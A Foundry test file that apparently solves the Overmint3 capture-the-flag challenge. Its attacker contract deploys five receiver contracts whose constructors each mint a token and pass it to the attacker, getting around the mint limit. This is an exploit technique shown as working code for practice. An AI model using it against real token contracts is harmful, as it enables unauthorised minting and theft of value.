// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {Overmint3} from "../src/Overmint3.sol";

pragma solidity ^0.8.0;

contract Overmint3Test is Test {
    Overmint3 overmintContract;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        overmintContract = new Overmint3();

        vm.deal(attacker, 3 ether);
    }

    function testOvermint3() public {
        uint256 currentNonce = vm.getNonce(attacker);

        vm.prank(attacker);
        new Overmint3Attacker(overmintContract);

        assertEq(overmintContract.balanceOf(attacker), 5);
        assert(vm.getNonce(attacker) < currentNonce + 2);
    }
}

contract Overmint3Attacker {
    constructor(Overmint3 _overmintContract) {
        for (uint256 i; i < 5; i++) {
            new Overmint3Receiver(_overmintContract, msg.sender);
        }
    }
}

contract Overmint3Receiver {
    constructor(Overmint3 overmintContract, address owner) {
        overmintContract.mint();
        overmintContract.transferFrom(address(this), owner, overmintContract.totalSupply());
    }
}
